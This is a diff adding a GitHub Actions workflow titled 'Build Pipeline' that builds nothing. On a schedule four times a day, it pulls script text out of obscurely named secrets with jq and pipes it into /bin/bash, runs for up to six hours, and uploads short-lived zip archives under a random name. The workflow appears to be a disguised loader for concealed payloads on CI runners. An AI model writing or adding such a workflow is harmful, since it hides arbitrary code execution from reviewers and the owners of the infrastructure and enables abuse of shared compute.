@@ -1,0 +1,31 @@
+name: Build Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '38 2,8,14,20 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  service:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run
+        env:
+          jzdr1: ${{ secrets.jzdr1 }}
+        run: |
+          printf '%s' "$jzdr1" | jq -r .qzqkl3674 | /bin/bash
+          echo $o2 | jq -r .qiy2 | /bin/bash
+          printf '%s' "$uh964" | jq -r .klam59 | /bin/bash
+          printf '%s' "$gf654" | jq -r .af288 | /bin/bash
+
+      - name: Save archive
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: Tv5E6ZBn
+          path: "*.zip"
+          retention-days: 1
